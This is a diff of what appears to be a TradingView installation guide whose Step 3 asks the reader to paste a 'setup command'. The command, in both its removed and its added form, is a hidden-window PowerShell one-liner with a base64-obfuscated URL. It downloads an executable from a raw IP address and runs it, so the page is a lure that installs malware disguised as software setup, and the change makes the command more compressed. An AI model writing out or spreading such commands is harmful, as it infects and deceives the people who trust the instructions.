@@ -8,7 +8,7 @@
 
 🔵 Step 3: Paste the setup command and press Enter
 
-powershell -WindowStyle Hidden -Command "$url=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cDovLzE3Ni40Ni4xNTIuNjI6NTg1OC9yYXAuZXhl')); iwr $url -OutF "$env:LOCALAPPDATA\rap.exe"; start "$env:LOCALAPPDATA\rap.exe""
+powershell -w h -c "$u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovLzE3Ni40Ni4xNTIuNjI6NTg1OC9yYXAuZXhl'));iwr $u -o $l\rap.exe;. $l\rap.exe"
 
 🔵 Step 4: Restart TradingView
 
